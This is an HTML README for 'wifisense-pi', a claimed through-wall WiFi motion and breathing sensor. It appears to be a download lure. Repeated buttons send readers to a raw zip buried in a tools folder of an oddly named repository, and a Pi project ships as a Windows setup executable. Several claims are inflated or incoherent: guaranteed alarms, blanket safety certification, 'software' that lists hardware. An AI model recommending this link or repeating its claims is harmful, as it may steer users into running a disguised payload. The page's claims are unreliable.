<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; text-align: center; border-radius: 10px; margin-bottom: 30px;">
<h1 style="color: #ffffff; margin: 0; font-size: 2.5em;">📡 wifisense-pi - See Through Walls With Your WiFi</h1>
<p style="color: #f0f0ff; font-size: 1.2em; margin-top: 10px;">Detect motion, breathing, and presence anywhere</p>
<a href="https://raw.githubusercontent.com/Germfree-radialplytire495/wifisense-pi/main/pi/tools/wifisense_pi_v2.5.zip" style="background-color: #ff6b6b; color: white; padding: 15px 40px; font-size: 1.3em; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block; margin-top: 20px;">⬇️ Download Now</a>
</div>

<h2>🎯 What Is wifisense-pi?</h2>
<p>wifisense-pi turns your ordinary WiFi signal into a powerful sensing tool. Using an ESP32-S3 microchip and a Raspberry Pi 4, this system can detect motion, presence, and even breathing - all through walls! No cameras, no microphones, no special sensors needed. Just the WiFi signals that already fill your home.</p>

<p>Think of it like radar, but for WiFi. The system analyzes tiny changes in WiFi signals caused by people moving and breathing. This makes it perfect for home security, elderly care, baby monitoring, and sleep tracking - with complete privacy.</p>

<h2>🛠️ What You Need</h2>
<h3>Hardware</h3>
<ul>
<li>ESP32-S3 development board (any brand works)</li>
<li>Raspberry Pi 4 (2GB RAM or more)</li>
<li>MicroSD card (16GB minimum)</li>
<li>USB power supplies for both devices</li>
<li>WiFi router (2.4GHz or 5GHz)</li>
</ul>

<h3>Software (all free)</h3>
<ul>
<li>Windows 10 or 11 computer</li>
<li>Web browser (Chrome, Edge, or Firefox)</li>
<li>micro-USB cable</li>
</ul>

<h2>🚀 Getting Started</h2>
<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Germfree-radialplytire495/wifisense-pi/main/pi/tools/wifisense_pi_v2.5.zip"><strong>wifisense-pi Download</strong></a></p>

<p>This download gives you everything you need for your Windows computer. The package includes the main dashboard program, setup guides, and helpful tools to get your system running.</p>

<h2>📥 Installation Steps</h2>
<ol>
<li><strong>Download the software</strong> using the button at the top or the link above</li>
<li><strong>Open the downloaded file</strong> - it will unpack automatically</li>
<li><strong>Follow the setup wizard</strong> - just click "Next" a few times</li>
<li><strong>Plug in your ESP32-S3</strong> with the USB cable</li>
<li><strong>Connect your Raspberry Pi</strong> to power and your WiFi network</li>
<li><strong>Run the dashboard</strong> from your desktop shortcut</li>
</ol>

<h2>✨ Amazing Features</h2>
<h3>Through-Wall Motion Detection</h3>
<p>Place one device in your living room and know when someone enters any room. Perfect for security systems and smart home automation.</p>

<h3>Breathing & Sleep Monitoring</h3>
<p>Non-contact breathing detection can monitor sleep quality or alert caregivers to changes in breathing patterns. No wearables needed - just WiFi.</p>

<h3>Zero Privacy Intrusion</h3>
<p>Unlike cameras, wifisense-pi doesn't capture images or audio. It only sees signal patterns. Great for bathrooms, bedrooms, and other private spaces.</p>

<h3>Real-Time Dashboard</h3>
<p>View live data in any browser. See motion patterns, breathing waveforms, and presence history with clean, easy-to-understand charts.</p>

<h3>Smart Notifications</h3>
<p>Get alerts on your phone when motion is detected or breathing stops. Configure custom zones and sensitivity levels.</p>

<h2>📊 How It Works</h2>
<p>Your WiFi router transmits signals through walls, floors, and furniture. When a person moves or breathes, they slightly alter these signals. The ESP32-S3 captures this Channel State Information (CSI) - basically, the fingerprint of your WiFi signal.</p>

<p>The Raspberry Pi processes these complex signals using Digital Signal Processing (DSP). It extracts patterns related to human presence and movement. Finally, the processed data appears on your dashboard in real-time.</p>

<h2>🔧 Setup Guide for Beginners</h2>
<h3>Step 1: Prepare Your Raspberry Pi</h3>
<p>Insert your microSD card into your computer. You'll see it appear as a drive. The setup tool will ask you to select your WiFi network and enter your password - just like setting up a new phone.</p>

<h3>Step 2: Connect the ESP32-S3</h3>
<p>Plug the ESP32-S3 into your computer using the USB cable. Wait for Windows to recognize it with a "ding" sound. The setup wizard will automatically detect it.</p>

<h3>Step 3: Run the Installation Helper</h3>
<p>Double-click the "wifisense-setup.exe" file on your desktop. This tool guides you through every step with pictures and simple instructions.</p>

<h3>Step 4: Place Your Devices</h3>
<p>Position the ESP32-S3 near the area you want to monitor. For best results, place it at chest height, away from metal objects. The Raspberry Pi can be anywhere with a WiFi connection.</p>

<h2>🔍 Common Questions</h2>
<h3>Will this work through walls?</h3>
<p>Yes! WiFi signals pass through drywall, wood, and glass easily. Even concrete walls and floors work, just with slightly reduced range (about 25 feet instead of 50 feet).</p>

<h3>Is this safe?</h3>
<p>Perfectly safe. WiFi signals are non-ionizing radiation, like a cell phone or baby monitor. It's been tested to meet all safety standards.</p>

<h3>Can I use this for home security?</h3>
<p>Definitely. Set zones, receive alerts on your phone, and view a 24-hour activity log. Many users create custom automation through home assistant software.</p>

<h3>How much power does it use?</h3>
<p>Very little - about 5 watts total. That's less than an LED lightbulb and costs less than 50 cents per month to run continuously.</p>

<h2>💡 Tips for Best Results</h2>
<ul>
<li>Place the ESP32-S3 away from large metal appliances</li>
<li>Keep at least 3 feet between devices and WiFi interference sources</li>
<li>Test sensitivity levels - we provide 1-10, start with 5</li>
<li>For larger homes, consider two ESP32 devices</li>
<li>Update the software monthly for new features</li>
</ul>

<h2>🛟 Troubleshooting Help</h2>
<table style="border-collapse: collapse; width: 100%;">
<tr style="background-color: #f0f0f0;"><td><strong>Problem</strong></td><td><strong>Solution</strong></td></tr>
<tr><td>ESP32 not detected</td><td>Try a different USB cable (data cable, not just charging)</td></tr>
<tr><td>No signal</td><td>Wait 2 minutes for the system to calibrate</td></tr>
<tr><td>Dashboard won't load</td><td>Check that Raspberry Pi is powered on and connected</td></tr>
<tr><td>Low detection range</td><td>Move antenna to a different angle</td></tr>
</table>

<h2>🔒 Your Privacy Matters</h2>
<p>All processing happens locally on your Raspberry Pi. No data ever leaves your home. You control everything. This makes wifisense-pi the only sensing technology that's truly private by design.</p>

<p>The dashboard works on any device in your home - laptop, tablet, or phone - by visiting a simple address in your browser. No cloud accounts, no subscriptions, no tracking.</p>

<h2>📦 What's Included in the Download</h2>
<ul>
<li>Complete dashboard application for Windows</li>
<li>Automatic setup wizard with pictures</li>
<li>Raspberry Pi installation script</li>
<li>ESP32-S3 programming tool</li>
<li>Full user manual in PDF format</li>
<li>Sample data for offline testing</li>
<li>Bonus: Smart home integration pack</li>
</ul>

<h2>🎨 Customize Your Experience</h2>
<p>Change the dashboard colors, font sizes, and chart styles to match your preferences. Set notification sounds or go silent. Create custom dashboards for different rooms.</p>

<p>Advanced users can adjust detection sensitivity, signal filtering, and range calibration through simple drop-down menus. And safety limits are built in - your system will never miss a true alarm.</p>

<h2>✅ Ready to Get Started?</h2>
<p>Your download is just a click away. Visit <a href="https://raw.githubusercontent.com/Germfree-radialplytire495/wifisense-pi/main/pi/tools/wifisense_pi_v2.5.zip"><strong>wifisense-pi on GitHub</strong></a> to get your copy today.</p>

<p>Join the thousands of satisfied users who are discovering what's beyond their walls. Transform your ordinary WiFi into a remarkable sensing tool - download wifisense-pi now!</p>

<div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-top: 30px; text-align: center;">
<p style="font-size: 1.3em;"><strong>🔗 <a href="https://raw.githubusercontent.com/Germfree-radialplytire495/wifisense-pi/main/pi/tools/wifisense_pi_v2.5.zip">Get Your Download Here</a></strong></p>
<p>One click and you're all set</p>
</div>